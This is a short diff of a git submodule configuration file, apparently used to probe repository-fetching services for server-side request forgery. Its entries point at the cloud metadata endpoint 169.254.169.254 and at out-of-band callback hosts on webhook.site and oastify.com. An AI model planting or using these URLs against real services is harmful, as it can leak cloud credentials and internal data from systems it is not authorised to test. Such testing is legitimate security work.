@@ -1,14 +1,18 @@
+[submodule "ssrf-submodule"]
+    path = ssrf-submodule
+    url = http://169.254.169.254/latest/meta-data/
+
 [submodule "webhook-detect"]
     path = webhook-detect
     url = http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/git-submodule-fetch
 
-[submodule "ssrf-test"]
-    path = ssrf-test
-    url = http://169.254.169.254/latest/meta-data/
-
 [submodule "burp-detect"]
     path = burp-detect  
     url = http://l2xnz18zf4mmtw8x8p4dqj8iixcklpnqq.oastify.com/submodule
+
+[submodule "ssrf-test"]
+    path = ssrf-test
+    url = http://169.254.169.254/latest/meta-data/
 
 [submodule "localhost-test"]
     path = localhost-test
